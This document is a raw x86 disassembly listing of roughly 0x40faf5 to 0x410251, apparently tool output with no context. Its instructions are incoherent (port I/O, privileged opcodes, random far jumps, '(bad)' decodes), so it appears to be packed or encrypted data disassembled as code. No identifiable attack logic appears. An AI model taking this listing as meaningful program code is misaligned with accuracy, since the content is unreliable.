  40faf5:	scas   al,BYTE PTR es:[edi]
  40faf6:	and    ebp,ebx
  40faf8:	retf   
  40faf9:	push   cs
  40fafa:	shr    BYTE PTR [ebx+0x30],cl
  40fafd:	sti    
  40fafe:	push   esi
  40faff:	xor    edx,DWORD PTR [edi+edi*4]
  40fb02:	mov    eax,DWORD PTR [edi+esi*8]
  40fb05:	xchg   ebp,eax
  40fb06:	xchg   edx,eax
  40fb07:	int3   
  40fb08:	lea    eax,[ebp-0x77]
  40fb0b:	mov    ah,BYTE PTR [edi+0x41c004]
  40fb11:	push   ebp
  40fb12:	add    DWORD PTR [eax],0x77
  40fb15:	and    BYTE PTR [edi+esi*1],ah
  40fb18:	and    edx,DWORD PTR [ebx]
  40fb1a:	sub    esi,esi
  40fb1c:	test   dh,ch
  40fb1e:	adc    al,0xb4
  40fb20:	fucomi st,st(0)
  40fb23:	inc    eax
  40fb24:	je     0x40fb88
  40fb26:	fldcw  WORD PTR [eax+0x78]
  40fb29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb2a:	pop    es
  40fb2b:	xor    WORD PTR es:[ebx],bx
  40fb2f:	mov    DWORD PTR gs:[ebp-0x63],0xd039e2ed
  40fb37:	les    eax,FWORD PTR [ecx-0x56]
  40fb3a:	sub    eax,0x3eefe6ab
  40fb3f:	outs   dx,BYTE PTR ds:[esi]
  40fb40:	mov    dl,0x67
  40fb42:	mov    cl,0xa7
  40fb44:	ror    BYTE PTR [di],cl
  40fb47:	pop    eax
  40fb48:	jb     0x40fb68
  40fb4a:	mov    ch,BYTE PTR [esi+0x131fa74b]
  40fb50:	pop    ebx
  40fb51:	ins    DWORD PTR es:[edi],dx
  40fb52:	mov    bh,0xed
  40fb54:	xor    eax,0x82840f11
  40fb59:	xchg   ecx,eax
  40fb5a:	pushf  
  40fb5b:	sub    ah,dh
  40fb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb5e:	sub    edi,ebp
  40fb60:	and    esi,DWORD PTR [esp+edi*1+0x41]
  40fb64:	mov    bl,0x9e
  40fb66:	xor    eax,0xa826b2c0
  40fb6b:	pop    esi
  40fb6c:	sub    dl,BYTE PTR [ecx+0x54]
  40fb6f:	jae    0x40fb8a
  40fb71:	retf   
  40fb72:	push   ebx
  40fb73:	sub    eax,0xfdc8d316
  40fb78:	pop    esp
  40fb79:	jo     0x40fb40
  40fb7b:	mov    cl,dl
  40fb7d:	pop    esi
  40fb7e:	int3   
  40fb7f:	cmc    
  40fb80:	shr    DWORD PTR [ecx-0x59],1
  40fb83:	int3   
  40fb84:	inc    edx
  40fb85:	invd   
  40fb87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb89:	sbb    DWORD PTR [edi*8+0x3fc77da9],eax
  40fb90:	mov    ecx,0x124c7d82
  40fb95:	mov    dl,0xc3
  40fb97:	out    dx,eax
  40fb98:	push   esi
  40fb99:	mov    dh,0xc0
  40fb9b:	aas    
  40fb9c:	in     al,dx
  40fb9d:	push   eax
  40fb9e:	pusha  
  40fb9f:	out    dx,al
  40fba0:	daa    
  40fba1:	push   0x6d
  40fba3:	mov    eax,0xe91838d9
  40fba8:	mov    ds:0x8a90cf21,eax
  40fbad:	out    0xfc,al
  40fbaf:	pop    DWORD PTR [ebx+esi*8-0x36b6afac]
  40fbb6:	fimul  WORD PTR [edx-0x50]
  40fbb9:	inc    ebx
  40fbba:	aaa    
  40fbbb:	test   eax,0xaba34150
  40fbc0:	xchg   ebx,eax
  40fbc1:	mov    WORD PTR [edi-0x1a],gs
  40fbc4:	test   eax,0xb5dc41d2
  40fbc9:	and    ebp,DWORD PTR [eax]
  40fbcb:	dec    edx
  40fbcd:	push   ss
  40fbce:	pop    edi
  40fbcf:	cwde   
  40fbd0:	pop    edx
  40fbd1:	add    eax,0x6be88b6
  40fbd6:	push   cs
  40fbd7:	lea    esp,es:[ebp+0x41]
  40fbdb:	outs   dx,BYTE PTR ds:[esi]
  40fbdc:	inc    esi
  40fbdd:	mov    esp,?
  40fbdf:	and    BYTE PTR [eax],ch
  40fbe1:	fwait
  40fbe2:	lods   al,BYTE PTR ds:[esi]
  40fbe3:	xor    ebp,esp
  40fbe5:	cli    
  40fbe6:	es and cl,cl
  40fbe9:	popa   
  40fbea:	adc    edx,ebp
  40fbec:	fwait
  40fbed:	add    al,0xad
  40fbef:	xlat   BYTE PTR ds:[ebx]
  40fbf0:	cmp    BYTE PTR [edx],dl
  40fbf2:	push   esp
  40fbf3:	in     eax,0xf4
  40fbf5:	stc    
  40fbf6:	call   0xa295:0x7c828522
  40fbfd:	push   esp
  40fbfe:	add    al,0xc0
  40fc00:	inc    eax
  40fc01:	sbb    ah,al
  40fc03:	jns    0x40fc3a
  40fc05:	cld    
  40fc06:	jae    0x40fbbf
  40fc08:	cdq    
  40fc09:	ds aaa 
  40fc0b:	adc    al,0x57
  40fc0d:	retf   0x7c69
  40fc10:	dec    ebp
  40fc11:	fstp   QWORD PTR [ecx+0x503715f2]
  40fc17:	shr    BYTE PTR [eax-0x4da731b7],1
  40fc1d:	out    dx,al
  40fc1e:	ja     0x40fbee
  40fc20:	daa    
  40fc21:	inc    esi
  40fc22:	mov    DWORD PTR [edi-0x28],ebp
  40fc25:	jae    0x40fbb1
  40fc27:	mov    ss,WORD PTR [ebx]
  40fc29:	jns    0x40fc10
  40fc2b:	and    BYTE PTR [eax+edi*2+0x24],dh
  40fc2f:	shl    bl,cl
  40fc31:	mov    ebp,0xac63e446
  40fc36:	loop   0x40fc8a
  40fc38:	sbb    al,0x5a
  40fc3a:	sub    BYTE PTR [edi],0x6
  40fc3d:	rcl    DWORD PTR [ebx-0x2e],0xd9
  40fc41:	out    dx,al
  40fc42:	(bad)  
  40fc43:	push   esi
  40fc44:	xchg   ebp,eax
  40fc45:	mov    ah,0xac
  40fc47:	push   esi
  40fc48:	retf   0x8d1
  40fc4b:	imul   edx,DWORD PTR [ebx],0x99c95394
  40fc51:	dec    esi
  40fc52:	pop    eax
  40fc53:	pop    es
  40fc54:	cmp    DWORD PTR [esi],ebp
  40fc56:	outs   dx,BYTE PTR ds:[esi]
  40fc57:	mov    eax,DWORD PTR [esi+0x7028a74d]
  40fc5d:	mov    ecx,DWORD PTR cs:[ebx+0x25d17aa3]
  40fc64:	mov    edx,0xf0305cf
  40fc69:	sub    ecx,ebx
  40fc6b:	imul   edx,eax,0x10
  40fc6e:	(bad)  
  40fc6f:	inc    ecx
  40fc70:	ja     0x40fcd0
  40fc72:	dec    ecx
  40fc73:	inc    edx
  40fc74:	mov    ebx,0xe391c60e
  40fc79:	dec    eax
  40fc7a:	fistp  QWORD PTR [edx+ebx*2+0x22e4d93c]
  40fc81:	xchg   ebx,eax
  40fc82:	cs jg  0x40fcd2
  40fc85:	dec    esi
  40fc86:	push   es
  40fc87:	js     0x40fcd8
  40fc89:	sub    bl,bh
  40fc8b:	stos   DWORD PTR es:[edi],eax
  40fc8c:	cdq    
  40fc8d:	dec    ecx
  40fc8e:	aaa    
  40fc8f:	test   al,0xfd
  40fc91:	loop   0x40fc65
  40fc93:	xor    edi,0x1af3277
  40fc99:	out    dx,al
  40fc9a:	sub    dh,ch
  40fc9c:	shl    DWORD PTR ds:[edx-0x1fc8099e],cl
  40fca3:	aam    0x51
  40fca5:	add    bl,BYTE PTR ds:[ebp+0x5a2a6d5e]
  40fcac:	test   al,0x57
  40fcae:	mov    esi,0x3069be2e
  40fcb3:	ja     0x40fd00
  40fcb5:	inc    ebp
  40fcb6:	fwait
  40fcb7:	inc    ebx
  40fcb8:	call   0x10e31d88
  40fcbd:	jge    0x40fc49
  40fcbf:	cwde   
  40fcc0:	inc    edi
  40fcc1:	sbb    al,0xb9
  40fcc3:	call   0x150fd1c4
  40fcc8:	jg     0x40fc61
  40fcca:	or     eax,0x43be65b1
  40fccf:	cmp    al,0xf1
  40fcd1:	and    bh,BYTE PTR [ecx]
  40fcd3:	ins    DWORD PTR es:[edi],dx
  40fcd4:	jb     0x40fcdf
  40fcd6:	add    edi,DWORD PTR [ebx+0x2d]
  40fcd9:	mov    al,0xf
  40fcdb:	and    DWORD PTR [edi+0x6803bdf6],esi
  40fce1:	les    esi,FWORD PTR [ebx-0x35]
  40fce4:	loopne 0x40fce9
  40fce6:	imul   ecx,edx,0x4f
  40fce9:	out    0x9d,eax
  40fceb:	xchg   edx,eax
  40fcec:	mov    bl,0x16
  40fcee:	fs leave 
  40fcf0:	push   es
  40fcf1:	jo     0x40fcd2
  40fcf3:	pop    edx
  40fcf4:	mov    al,0xb3
  40fcf6:	cwde   
  40fcf7:	sub    dh,0x30
  40fcfa:	mov    eax,ds:0x4ccffc5e
  40fcff:	loope  0x40fd27
  40fd01:	scas   al,BYTE PTR es:[edi]
  40fd02:	hlt    
  40fd03:	repnz pop ebx
  40fd05:	jmp    0x700:0x4bbe5309
  40fd0c:	stc    
  40fd0d:	in     al,0x12
  40fd0f:	push   esi
  40fd10:	pop    ebx
  40fd11:	xchg   edi,eax
  40fd13:	out    0x4f,eax
  40fd15:	mov    esi,0x55d2bae1
  40fd1a:	jb     0x40fcab
  40fd1c:	pop    ebx
  40fd1d:	mov    dl,0x4
  40fd1f:	out    dx,al
  40fd20:	sbb    ebx,ecx
  40fd22:	(bad)  
  40fd23:	movups xmm1,XMMWORD PTR [ecx-0x656768db]
  40fd2a:	nop
  40fd2b:	sbb    DWORD PTR [eax+edx*8+0x6ca76cda],0xee28e6fb
  40fd36:	rol    DWORD PTR [ecx-0x1f],1
  40fd39:	enter  0x7e67,0x1
  40fd3d:	or     al,0x5d
  40fd3f:	adc    eax,DWORD PTR [eax+0x26]
  40fd42:	add    al,0xfe
  40fd44:	cdq    
  40fd45:	mov    ds:0xda21d703,al
  40fd4a:	dec    ebx
  40fd4b:	add    al,BYTE PTR [ecx+0x3b957624]
  40fd51:	stos   BYTE PTR es:[edi],al
  40fd52:	dec    edx
  40fd53:	in     al,0x4
  40fd55:	adc    bl,ah
  40fd57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd58:	sub    edx,DWORD PTR [edx+0x2e06604c]
  40fd5e:	mov    edi,0xde62374f
  40fd63:	daa    
  40fd64:	sub    ah,BYTE PTR [esi-0x1a27f8fc]
  40fd6a:	rol    BYTE PTR [eax+0x3b4413bf],1
  40fd70:	dec    ebx
  40fd71:	and    DWORD PTR [edi+0x4e],0xffffff89
  40fd75:	ins    BYTE PTR es:[edi],dx
  40fd76:	adc    BYTE PTR [eax+0x5f],ch
  40fd79:	or     DWORD PTR [edx],ebp
  40fd7b:	sti    
  40fd7c:	adc    DWORD PTR [eax],ebx
  40fd7e:	xor    BYTE PTR [ebx+ebp*8-0x5c19253],0x69
  40fd86:	push   ecx
  40fd87:	ins    DWORD PTR es:[edi],dx
  40fd88:	mov    dl,0x10
  40fd8a:	aaa    
  40fd8b:	push   ebx
  40fd8c:	adc    BYTE PTR [edx+0x5daba696],ch
  40fd92:	sbb    DWORD PTR [eax],ecx
  40fd94:	adc    eax,0x334a5a7a
  40fd99:	in     eax,dx
  40fd9a:	mov    eax,ds:0x8915dd9
  40fd9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fda0:	inc    edx
  40fda1:	pushf  
  40fda2:	ins    DWORD PTR es:[edi],dx
  40fda3:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fda5:	pop    es
  40fda6:	jo     0x40fdc1
  40fda8:	add    al,0x85
  40fdaa:	xor    BYTE PTR [ecx],ch
  40fdac:	aad    0xf6
  40fdae:	fdivr  DWORD PTR [edi]
  40fdb0:	dec    edx
  40fdb1:	mov    DWORD PTR [edi+0x30],esi
  40fdb4:	sub    BYTE PTR [ecx+0x6d],ch
  40fdb7:	aad    0x87
  40fdb9:	shr    BYTE PTR [ebx-0x12fc0653],cl
  40fdbf:	push   edx
  40fdc0:	mov    WORD PTR [ebp+edx*4+0x5a0c5346],ds
  40fdc7:	mov    bl,0x52
  40fdc9:	ja     0x40fd50
  40fdcb:	push   ebx
  40fdcc:	data16 ja 0x40fdf7
  40fdcf:	inc    esp
  40fdd0:	mov    al,0x96
  40fdd2:	shr    DWORD PTR [esi-0x5c],cl
  40fdd5:	(bad)  
  40fdd6:	es sub cl,ch
  40fdd9:	ficom  WORD PTR [ebx+ecx*8]
  40fddc:	enter  0x4eb0,0xe2
  40fde0:	dec    ebx
  40fde1:	xlat   BYTE PTR ds:[ebx]
  40fde2:	pop    ds
  40fde3:	mov    al,0x6b
  40fde5:	push   ds
  40fde6:	sbb    edx,DWORD PTR ds:0x160e4add
  40fdec:	xchg   ecx,eax
  40fded:	or     esp,DWORD PTR [eax-0x3b]
  40fdf0:	jp     0x40fe11
  40fdf2:	adc    eax,0x85ddf1a5
  40fdf7:	jne    0x40fe70
  40fdf9:	add    al,0x37
  40fdfb:	outs   dx,DWORD PTR ds:[esi]
  40fdfc:	jne    0x40fe44
  40fdfe:	or     al,0x93
  40fe00:	dec    edx
  40fe01:	int3   
  40fe02:	mov    ebp,?
  40fe04:	data16 jnp 0x40fda3
  40fe07:	pop    ecx
  40fe08:	cdq    
  40fe09:	add    eax,0xc86955f0
  40fe0e:	(bad)  
  40fe0f:	fisttp WORD PTR [ebp-0x2135b770]
  40fe15:	lock adc edi,DWORD PTR [ecx]
  40fe18:	int3   
  40fe19:	push   esi
  40fe1a:	inc    esp
  40fe1b:	cs (bad) 
  40fe1d:	sahf   
  40fe1e:	sahf   
  40fe1f:	mov    WORD PTR [eax],ss
  40fe21:	dec    edx
  40fe22:	mov    al,ds:0x1a3df842
  40fe27:	cmc    
  40fe28:	or     esi,DWORD PTR [esi-0x80]
  40fe2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe2c:	das    
  40fe2d:	mov    dl,0xe9
  40fe2f:	cdq    
  40fe30:	sbb    al,0xba
  40fe32:	das    
  40fe33:	inc    ecx
  40fe34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe35:	lods   eax,DWORD PTR ds:[esi]
  40fe36:	jmp    0x3e69eb6f
  40fe3b:	pop    eax
  40fe3c:	popa   
  40fe3d:	lock mov ebx,0x1669864e
  40fe43:	xchg   esp,eax
  40fe44:	retf   0x4f87
  40fe47:	loop   0x40fe33
  40fe49:	ret    
  40fe4a:	or     edi,ecx
  40fe4c:	dec    eax
  40fe4d:	xchg   ebp,eax
  40fe4e:	test   al,0x6d
  40fe50:	mov    ebp,DWORD PTR [esp+esi*2+0x5b96a65f]
  40fe57:	mov    dh,0xeb
  40fe59:	(bad)
  40fe5d:	je     0x40feb0
  40fe5f:	inc    ebp
  40fe60:	les    ebp,FWORD PTR [ecx-0x22]
  40fe63:	aaa    
  40fe64:	xor    eax,0x28fb9766
  40fe69:	and    ecx,DWORD PTR [ebp+0x62865cdc]
  40fe6f:	or     edi,DWORD PTR [eax+0x74]
  40fe72:	popa   
  40fe73:	aaa    
  40fe74:	sbb    al,0x76
  40fe76:	nop
  40fe77:	jmp    0x40fe08
  40fe79:	cs dec eax
  40fe7b:	iret   
  40fe7c:	adc    eax,ebp
  40fe7e:	fsubp  st(1),st
  40fe80:	call   0xe0c9:0xe9efdd2d
  40fe87:	das    
  40fe88:	(bad)  
  40fe8a:	push   ecx
  40fe8b:	int    0x1f
  40fe8d:	std    
  40fe8e:	or     DWORD PTR [edx+0x3d],esp
  40fe91:	cli    
  40fe92:	clc    
  40fe93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe94:	cli    
  40fe95:	mov    bl,0x8d
  40fe97:	jb     0x40feef
  40fe99:	fadd   DWORD PTR [ecx+0x2fb2143]
  40fe9f:	ret    
  40fea0:	push   esi
  40fea1:	adc    al,0xb1
  40fea3:	cld    
  40fea4:	scas   eax,DWORD PTR es:[edi]
  40fea5:	pop    ebx
  40fea6:	jbe    0x40fe31
  40fea8:	(bad)  
  40fea9:	adc    DWORD PTR [ebp+0x4],0x41b3a0e4
  40feb0:	ja     0x40fee7
  40feb2:	ins    BYTE PTR es:[edi],dx
  40feb3:	int    0x0
  40feb5:	mov    ch,0x1a
  40feb7:	fucomp st(0)
  40feb9:	outs   dx,DWORD PTR ds:[esi]
  40feba:	xchg   edx,eax
  40febb:	pop    ebp
  40febc:	mov    edi,0xdaa4ed74
  40fec1:	aaa    
  40fec2:	xor    DWORD PTR [eax+ebx*2],ecx
  40fec5:	inc    esi
  40fec6:	in     al,0x13
  40fec8:	jg     0x40ff09
  40feca:	or     DWORD PTR [eax],eax
  40fecc:	jge    0x40ff32
  40fece:	xchg   ebx,eax
  40fecf:	cdq    
  40fed0:	mov    eax,0xb449e056
  40fed5:	sub    BYTE PTR [ebx],dl
  40fed7:	pop    edi
  40fed8:	test   eax,0xdae8a9a5
  40fedd:	jmp    0x45f3:0x94e522f5
  40fee4:	cli    
  40fee5:	mov    esi,0x6848a6bd
  40feea:	push   ds
  40feeb:	xchg   BYTE PTR [edi-0x3a],ch
  40feee:	push   0xb0436ace
  40fef3:	fs shr ebp,cl
  40fef6:	and    eax,esp
  40fef8:	push   0xffffffc1
  40fefa:	out    0xaa,eax
  40fefc:	lea    ecx,[ecx+0x2114534f]
  40ff02:	sub    ebx,ecx
  40ff04:	and    dl,BYTE PTR fs:[edi+0x6d]
  40ff08:	jae    0x40feb0
  40ff0a:	sbb    ah,dh
  40ff0c:	mov    cl,ch
  40ff0e:	xchg   edx,eax
  40ff0f:	and    cl,BYTE PTR [eax+0xe]
  40ff12:	or     al,bl
  40ff14:	xor    DWORD PTR [esi+0x74923f3],esi
  40ff1a:	xor    DWORD PTR [ebx+edi*2],edx
  40ff1d:	cmp    al,0x35
  40ff1f:	cli    
  40ff20:	stc    
  40ff21:	push   ds
  40ff22:	and    dl,BYTE PTR [eax-0x70ecab8d]
  40ff28:	addr16 in eax,0x1f
  40ff2b:	dec    esp
  40ff2c:	mov    dh,0x3c
  40ff2e:	es fwait
  40ff30:	je     0x40ff09
  40ff32:	or     DWORD PTR [ecx+edi*8+0x2ac11941],edx
  40ff39:	test   al,0x91
  40ff3b:	pop    esi
  40ff3c:	and    dl,BYTE PTR ds:0xa6961109
  40ff42:	push   esp
  40ff43:	jmp    0x40fef0
  40ff45:	push   esi
  40ff46:	mov    ds,WORD PTR [edi]
  40ff48:	in     al,0x67
  40ff4a:	push   esi
  40ff4b:	pushf  
  40ff4c:	or     DWORD PTR [ecx-0x62],esi
  40ff4f:	inc    edx
  40ff50:	lock cmps WORD PTR ds:[esi],WORD PTR es:[edi]
  40ff53:	jle    0x40ff34
  40ff55:	jno    0x40ffc4
  40ff57:	fcomip st,st(4)
  40ff59:	mov    ds:0xc14f6464,al
  40ff5e:	mov    cl,0x30
  40ff60:	mov    edi,0xed1ffd35
  40ff65:	int3   
  40ff66:	dec    edi
  40ff67:	iret   
  40ff68:	cmp    esp,0xffffff83
  40ff6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff6c:	xor    eax,0x805fcad5
  40ff71:	mov    eax,ds:0xdad2f1fa
  40ff76:	mov    ebx,0x41cf8
  40ff7b:	sar    BYTE PTR [ecx],0xaf
  40ff7e:	and    eax,0x179109f
  40ff83:	push   ebp
  40ff84:	xchg   esi,eax
  40ff85:	les    esp,FWORD PTR [edi]
  40ff87:	gs adc al,0x31
  40ff8a:	xchg   edi,eax
  40ff8b:	or     DWORD PTR [ebp+0x574d2bf1],esi
  40ff91:	mov    BYTE PTR [ebp+ecx*1-0x55356d65],ah
  40ff98:	jno    0x40ffc4
  40ff9a:	sbb    BYTE PTR [ecx+edx*8],0xfe
  40ff9e:	adc    eax,0xcfb0e2c0
  40ffa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa4:	jg     0x40ff2e
  40ffa6:	sbb    eax,0x65b7509a
  40ffab:	jne    0x40ff75
  40ffad:	push   ebx
  40ffae:	adc    cl,BYTE PTR [ebp-0x2921e53c]
  40ffb4:	fdivr  st(1),st
  40ffb6:	call   0x9d83:0x3ab71288
  40ffbd:	test   DWORD PTR [esi],ebp
  40ffbf:	fmul   st,st(2)
  40ffc1:	enter  0x3711,0xcf
  40ffc5:	or     esi,DWORD PTR [edx]
  40ffc7:	and    DWORD PTR [ebx],ecx
  40ffc9:	push   esi
  40ffca:	xor    eax,0x8854d133
  40ffcf:	sub    ebx,edi
  40ffd1:	es jno 0x410034
  40ffd4:	xor    edx,DWORD PTR [eax]
  40ffd6:	adc    DWORD PTR ds:0xe3537588,eax
  40ffdc:	sub    al,ch
  40ffde:	sbb    eax,0x742de130
  40ffe3:	adc    DWORD PTR [ecx+0x707b431a],esi
  40ffe9:	push   esi
  40ffea:	push   0x57
  40ffec:	(bad)  
  40ffed:	or     DWORD PTR [eax+0x2e],ebp
  40fff0:	xor    eax,0x9cd7ac56
  40fff5:	mov    bl,0xaa
  40fff7:	ror    edx,0x94
  40fffa:	push   0xee7723fe
  40ffff:	inc    esp
  410000:	test   cl,bh
  410002:	cld    
  410003:	or     al,0x1b
  410005:	xchg   bl,dl
  410007:	mov    dl,0x5
  410009:	push   0xfffffff8
  41000b:	mov    esp,0xeb0660ff
  410010:	sbb    eax,0x8cea9b26
  410015:	jns    0x410007
  410017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410018:	adc    DWORD PTR [ecx+0x4a07d845],esi
  41001e:	add    ebp,DWORD PTR [eax-0x170d2635]
  410024:	bound  edi,QWORD PTR [ecx]
  410026:	push   cs
  410027:	push   es
  410028:	test   DWORD PTR fs:[ebp+0x6b1836eb],esp
  41002f:	popf   
  410030:	mov    ebx,DWORD PTR [eax+0x41dfdd5]
  410036:	hlt    
  410037:	sbb    BYTE PTR ds:0xadb21643,bl
  41003d:	ins    BYTE PTR es:[edi],dx
  41003e:	pop    esp
  41003f:	mov    eax,0xd11c8386
  410044:	fstp   TBYTE PTR [edx-0x11aa2c0d]
  41004a:	pop    ebp
  41004b:	mov    al,ds:0xec8e1e83
  410050:	mov    bl,0xc
  410052:	in     al,0x3
  410054:	mov    ah,0x1c
  410056:	popf   
  410057:	lahf   
  410058:	push   ds
  410059:	cs xchg ebp,eax
  41005b:	shl    ebp,0x27
  41005e:	inc    ebx
  41005f:	dec    ebx
  410060:	fs mov ebx,0x18f1ba67
  410066:	fmul   DWORD PTR [edx]
  410068:	adc    DWORD PTR [eax-0x6d],ebx
  41006b:	mov    esp,eax
  41006d:	out    dx,al
  41006e:	pop    edx
  41006f:	jg     0x41005f
  410071:	or     eax,0x1007052e
  410076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410077:	push   ecx
  410078:	fsin   
  41007a:	pop    esi
  41007b:	xchg   esp,eax
  41007c:	mov    DWORD PTR [eax-0x1c],edi
  41007f:	xor    al,0x16
  410081:	aaa    
  410082:	xchg   bl,cl
  410084:	jmp    0xa3e6ed49
  410089:	mov    dh,0xde
  41008b:	fild   DWORD PTR ds:0x60713328
  410091:	call   0x119:0xda992829
  410098:	cdq    
  410099:	push   esi
  41009a:	ds sbb ch,ah
  41009d:	sbb    ebx,edi
  41009f:	test   al,0x69
  4100a1:	sar    BYTE PTR [esi-0x1110a426],1
  4100a7:	xor    edx,eax
  4100a9:	stos   BYTE PTR es:[edi],al
  4100aa:	mov    al,0x3a
  4100ac:	cwde   
  4100ad:	dec    ecx
  4100ae:	push   0x80b0f4c0
  4100b3:	mov    ds:0x7a37d9ea,eax
  4100b8:	ret    
  4100b9:	dec    edi
  4100ba:	dec    edx
  4100bb:	add    al,0x94
  4100bd:	jle    0x4100a8
  4100bf:	inc    esp
  4100c0:	mov    WORD PTR [ebx-0x1b],ds
  4100c3:	cli    
  4100c4:	std    
  4100c5:	mov    ebx,0x6e21748b
  4100ca:	cmp    ah,bh
  4100cc:	inc    edx
  4100cd:	fisubr DWORD PTR [ebx]
  4100cf:	jmp    0x5c70:0xc249ed4a
  4100d6:	(bad)
  4100d9:	sub    DWORD PTR [eax+0x4ebe12fb],ecx
  4100df:	push   0x92d69caf
  4100e4:	nop
  4100e5:	shl    al,0xc5
  4100e8:	adc    DWORD PTR ds:0x6cdf66d4,0x3e551db5
  4100f2:	call   0x9474:0x32e160a0
  4100f9:	jae    0x4100ff
  4100fb:	test   bl,bh
  4100fd:	es stos DWORD PTR es:[edi],eax
  4100ff:	sub    al,0xf9
  410101:	mov    eax,0x91ecfad1
  410106:	ja     0x41014e
  410108:	push   edx
  410109:	xchg   DWORD PTR [eax],ebx
  41010b:	std    
  41010c:	fsubr  st(1),st
  41010e:	pop    ebx
  41010f:	jge    0x4100f9
  410111:	mov    eax,ds:0xd8f9bcfc
  410116:	lods   eax,DWORD PTR ds:[esi]
  410117:	into   
  410118:	cmp    edi,edi
  41011a:	call   0x686e3d95
  41011f:	mov    fs,WORD PTR [ebx]
  410121:	push   ecx
  410122:	stos   DWORD PTR es:[edi],eax
  410123:	xchg   ecx,eax
  410124:	jbe    0x4100d8
  410126:	adc    DWORD PTR [ebx-0x4d],0x3e
  41012a:	sbb    BYTE PTR ds:0x1c47202,bl
  410130:	jmp    0xc26e:0x6c06778e
  410137:	xchg   edi,eax
  410138:	loop   0x41018f
  41013a:	xchg   DWORD PTR [esi],ecx
  41013c:	adc    al,0x83
  41013e:	mov    BYTE PTR [eax-0x69ec4cdc],cl
  410144:	fistp  DWORD PTR [ebp-0x43]
  410147:	push   ebp
  410148:	mov    dl,0x89
  41014a:	popa   
  41014b:	jns    0x410130
  41014d:	shr    BYTE PTR [ebx+ebx*2+0x4b23a726],1
  410154:	mov    bl,0x9c
  410156:	pop    edx
  410157:	and    edx,0x71
  41015a:	dec    edi
  41015b:	ret    
  41015c:	pop    esp
  41015d:	popa   
  41015e:	jns    0x410133
  410160:	outs   dx,BYTE PTR ds:[esi]
  410161:	sub    eax,0xc7b153e9
  410166:	and    eax,0x31b5ba57
  41016b:	mov    eax,0x5c38c16
  410170:	jle    0x410142
  410172:	ins    BYTE PTR es:[edi],dx
  410173:	adc    BYTE PTR [ebx],0xa4
  410176:	inc    edx
  410177:	push   ss
  410178:	xor    eax,0x7183728d
  41017d:	push   ebp
  41017e:	sbb    al,0x62
  410180:	ret    
  410181:	dec    ecx
  410182:	xor    bh,bl
  410184:	lock push es
  410186:	push   cs
  410187:	aaa    
  410188:	pop    ds
  410189:	js     0x410170
  41018b:	adc    dl,BYTE PTR [edi]
  41018d:	xchg   ebx,eax
  41018e:	and    bl,bl
  410190:	div    ebp
  410192:	add    edx,esp
  410194:	mov    ds:0x2b5609c,eax
  410199:	push   edx
  41019a:	or     DWORD PTR [ebx-0x3b],edx
  41019d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41019e:	in     al,0xd9
  4101a0:	not    BYTE PTR [edi+eiz*8]
  4101a3:	cmp    dh,BYTE PTR [edi]
  4101a5:	inc    edx
  4101a6:	mov    ds:0xb783039f,eax
  4101ab:	or     bh,dh
  4101ad:	fdiv   st(4),st
  4101af:	or     eax,DWORD PTR [ecx-0x56]
  4101b2:	add    dl,BYTE PTR [ecx]
  4101b4:	es pop edi
  4101b6:	fisub  WORD PTR [esi-0x1f]
  4101b9:	mov    esi,0xb0fc1e7
  4101be:	in     eax,dx
  4101bf:	in     al,dx
  4101c0:	mov    ds:0x768cb92e,eax
  4101c5:	das    
  4101c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101c7:	mov    dl,0x8b
  4101c9:	shr    bh,cl
  4101cb:	jge    0x410212
  4101cd:	gs loope 0x41024b
  4101d0:	mov    bl,0xcf
  4101d2:	lods   eax,DWORD PTR ds:[esi]
  4101d3:	adc    al,0xd0
  4101d5:	or     edx,DWORD PTR [ecx+0x51b19769]
  4101db:	pop    ebx
  4101dc:	jno    0x41018a
  4101de:	fdiv   st(4),st
  4101e0:	outs   dx,BYTE PTR ds:[esi]
  4101e1:	leave  
  4101e2:	add    al,0x3b
  4101e4:	sbb    al,0x66
  4101e6:	mov    ebx,0x9e6e5c99
  4101eb:	push   edx
  4101ec:	mov    edx,0x4bd89234
  4101f1:	lods   al,BYTE PTR ds:[esi]
  4101f2:	push   esp
  4101f3:	repnz (bad) 
  4101f5:	iret   
  4101f6:	std    
  4101f7:	xor    BYTE PTR [esi-0x4e],bl
  4101fa:	minps  xmm4,XMMWORD PTR [eax-0xd36307f]
  410201:	lods   ax,WORD PTR ds:[esi]
  410203:	(bad)  
  410204:	out    dx,al
  410205:	stc    
  410206:	int    0xb0
  410208:	ffree  st(2)
  41020a:	imul   edx,ebx,0xffffffaf
  41020d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41020e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41020f:	retf   
  410210:	js     0x4101e0
  410212:	ss jl  0x4101d2
  410215:	fcomp  DWORD PTR [ebx]
  410217:	sub    ah,BYTE PTR [ebp-0x31c894ec]
  41021d:	add    al,0x3f
  41021f:	xchg   edi,eax
  410220:	ins    DWORD PTR es:[edi],dx
  410221:	sbb    eax,0x93c4dc75
  410226:	iret   
  410227:	fcmovnbe st,st(1)
  410229:	jns    0x410293
  41022b:	and    DWORD PTR [esp+ebx*1+0x316cca2d],esi
  410232:	or     BYTE PTR [edx+0x53],dh
  410235:	das    
  410236:	sub    edi,ebp
  410238:	hlt    
  410239:	sbb    BYTE PTR [edx+0x5d01bfdd],ah
  41023f:	aas    
  410240:	xchg   esp,eax
  410241:	sub    ebx,DWORD PTR [ebx-0x261449fc]
  410247:	stc    
  410248:	xor    ah,BYTE PTR [edx+0x8758eac]
  41024e:	push   eax
  41024f:	cmp    al,0xb8
  410251:	sbb    al,cl
